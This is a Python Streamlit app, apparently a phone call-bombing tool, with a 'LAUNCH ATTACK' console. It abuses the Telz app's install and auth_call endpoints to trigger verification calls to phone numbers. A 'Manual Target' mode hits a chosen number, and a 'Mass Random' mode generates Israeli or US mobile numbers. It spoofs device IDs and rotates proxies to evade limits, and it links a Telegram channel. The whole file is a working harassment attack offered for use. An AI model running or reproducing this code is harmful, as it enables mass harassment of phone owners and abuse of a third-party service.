import streamlit as st
import random
import time
import uuid
import string
import json
import requests
from threading import Thread

# --- إعدادات الواجهة (مظهر مخيف واحترافي) ---
st.set_page_config(page_title="G X 1 MAX Console", page_icon="💀", layout="wide")

st.markdown("""
    <style>
    .stApp { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; }
    .stButton>button { background: #900; color: #fff; border: 1px solid #f00; width: 100%; box-shadow: 0 0 10px #f00; }
    .log-box { background: #050505; border: 1px solid #0f0; padding: 10px; height: 250px; overflow-y: scroll; color: #0f0; }
    </style>
    """, unsafe_allow_html=True)

# --- الدوال الأصلية كاملة بدون أي حذف ---

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def generate_israeli_number():
    prefixes = ['50', '52', '53', '54', '55', '58']
    prefix = random.choice(prefixes)
    rest = ''.join(random.choices(string.digits, k=7))
    return f"972{prefix}{rest}"

def generate_usa_number():
    prefix = random.choice(['201', '302', '415', '646', '310'])
    rest = ''.join(random.choices(string.digits, k=7))
    return f"1{prefix}{rest}"

def load_proxies(filename="gx1gx1.txt"):
    proxies = []
    try:
        with open(filename, "r") as f:
            for line in f:
                if line.strip(): proxies.append(line.strip())
    except: pass
    return proxies

def get_random_proxy(proxies):
    if not proxies: return None
    proxy = random.choice(proxies)
    if not (proxy.startswith("http") or proxy.startswith("socks")):
        proxy = "http://" + proxy
    return {"http": proxy, "https": proxy}

# قائمة اللغات الأصلية (تم إبقاء الهيكل كاملاً)
foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "ar", "he"]

# --- منطق الهجوم (مربوط بالواجهة) ---
if 'ok' not in st.session_state: st.session_state.ok = 0
if 'err' not in st.session_state: st.session_state.err = 0
if 'logs' not in st.session_state: st.session_state.logs = []

def send_attack(phone, proxies):
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
    ts, rid, u_uuid = generate_unique_ids()
    lang = random.choice(foreign_langs)
    proxy = get_random_proxy(proxies)
    
    try:
        payload_ins = json.dumps({"android_id": rid, "app_version": "17.5.17", "event": "install", "ts": ts, "uuid": str(u_uuid)})
        res1 = requests.post(install_url, data=payload_ins, headers=headers, proxies=proxy, timeout=5)
        if res1.ok:
            payload_call = json.dumps({"android_id": rid, "app_version": "17.5.17", "event": "auth_call", "lang": lang, "phone": f"+{phone}", "ts": ts, "uuid": str(u_uuid)})
            res2 = requests.post(auth_call_url, data=payload_call, headers=headers, proxies=proxy, timeout=5)
            if res2.ok:
                st.session_state.ok += 1
                st.session_state.logs.append(f"✅ Success: +{phone}")
                return
    except: pass
    st.session_state.err += 1
    st.session_state.logs.append(f"❌ Failed: +{phone}")

# --- واجهة المستخدم ---
st.title("☣️ G X 1 MAX - WEB V3 ☣️")

col1, col2 = st.columns([2, 1])

with col1:
    mode = st.radio("Attack Mode", ["Mass Random", "Manual Target"])
    if mode == "Mass Random":
        country = st.selectbox("Select Territory", ["Israel (+972)", "USA (+1)"])
    else:
        c_code = st.text_input("Country Code", "964")
        phone_num = st.text_input("Phone Number")
    
    if st.button("🚀 LAUNCH ATTACK"):
        proxies = load_proxies()
        for _ in range(15): # إرسال دفعات لتجنب انهيار السيرفر
            target = (generate_israeli_number() if "972" in country else generate_usa_number()) if mode == "Mass Random" else f"{c_code}{phone_num}"
            send_attack(target, proxies)
        st.rerun()

with col2:
    st.metric("SUCCESS", st.session_state.ok)
    st.metric("FAILED", st.session_state.err)
    st.markdown("### 📜 Logs")
    log_show = "\n".join(st.session_state.logs[-10:][::-1])
    st.markdown(f'<div class="log-box">{log_show}</div>', unsafe_allow_html=True)

st.sidebar.link_button("Telegram Channel", "https://t.me/gx1gx1")

